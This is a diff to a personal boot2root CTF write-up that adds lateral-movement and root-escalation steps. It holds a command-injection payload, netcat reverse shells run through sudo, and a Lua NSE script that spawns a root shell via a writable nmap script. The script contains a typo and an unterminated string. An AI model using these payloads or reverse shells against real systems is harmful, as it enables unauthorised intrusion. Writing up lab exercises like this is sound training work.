@@ -1,7 +1,7 @@
 
 2024-11-05 20:23
 
-Source: #Boot2root 
+Source: #Boot2root #privesc 
 
 Nmap scan the IP
 Directory Bursting on Website
@@ -26,7 +26,7 @@ There is some sanitization to avoid RCE, but by using `&&` , we can still execut
 ip=file:///etc/passwd&&id&&
 ```
 
-#### Gaining foothold
+### Gaining foothold
 
 I used ngrok to gain a foothold on the punisher user, and for the rest of the lateral movement, I used the CTF server itself. 
 I used ngrok to expose my local port to the internet so that I could upload a shell code file onto the server
@@ -48,8 +48,59 @@ ip=file:///etc/passwd&&bash /tmp/shell.sh&&
 start a listener on port 80 and get the shell before executing shell.sh
 
 after getting the shell we see in `/opt/ftp_cred.txt`
-there are FTP credentials for user `punisher` 
+there are credentials for user `punisher` , login using `su punisher`
 
+### Lateral Movement to pettigrul user
+
+I wrote into `/tmp/xyz.sh` below command 
+```sh
+nc localhost 6699 -e /bin/bash
+```
+
+And started a listener as punisher user on other tab 
+```sh
+nc -nvlp 6699
+```
+
+To execute it I ran below command
+```sh
+sudo -u pettigrul /tmp/xyz.sh
+``` 
+And got the shell as pettigrul user
+### Privesc to root
+
+`sudo -l ` shows 
+```
+(ALL) NOPASSWD: /usr/bin/nmap 127.0.0.1 -p 80 --script\=http-title
+``` 
+
+The nmap way was easy for me because I had already written a Lua command execution script before. I just had to modify it a bit
+Below Lua script will run command `nc 127.0.0.1 6699 -e /bin/bash`
+
+```lua
+local nmap = require "nmap"
+local stdnse = require "stdnse" 
+local shortport = require "shortport"
+
+-- Port rule to target HTTP (port 80) 
+portrule = shortport.port_or_service(80, "http") 
+
+action = function(host, port) 
+	local attacker_ip = "127.0.0.1" -- Set to your IP 
+	local attacker_port = 6699 -- Set to the port you're listening on
+
+	-- Execute the reverse shell using nc -e /bin/bash 
+	local handle = io.popen("nc " .. attacker_ip .. " " .. a ttacker_port .. " -e /bin/bash")
+	
+	-- Close the handle after execution 
+	handle:close()
+	
+	 return "Reverse shell executed using nc -e /bin/bash
+```
+
+Since `http-title.nse` was writable, I just copied and pasted the above script after starting the listener
+
+sudo /usr/bin/nmap 127.0.0.1 -p 80 --script\=http-title Got the foothold as root use
 
 ### References
  ISH CTF - Shivam
